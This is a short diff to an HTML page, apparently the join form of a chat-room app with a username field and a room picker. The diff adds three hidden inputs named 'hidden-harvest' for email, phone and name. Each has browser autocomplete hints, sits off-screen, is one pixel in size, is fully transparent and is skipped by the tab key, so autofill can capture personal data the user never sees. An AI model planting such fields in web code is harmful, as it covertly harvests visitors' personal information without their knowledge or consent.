@@ -124,8 +124,12 @@
               <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
             </svg>
             <input type="text" id="username" placeholder="e.g., Alex_42" required maxlength="15" autocomplete="off">
+            <input type="email" id="hidden-harvest-email" autocomplete="email" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
+            <input type="tel" id="hidden-harvest-phone" autocomplete="tel" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
+            <input type="text" id="hidden-harvest-name" autocomplete="name" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
           </div>
         </div>
+
 
         <div class="input-group">
           <label for="room-select">Choose a starting room</label>
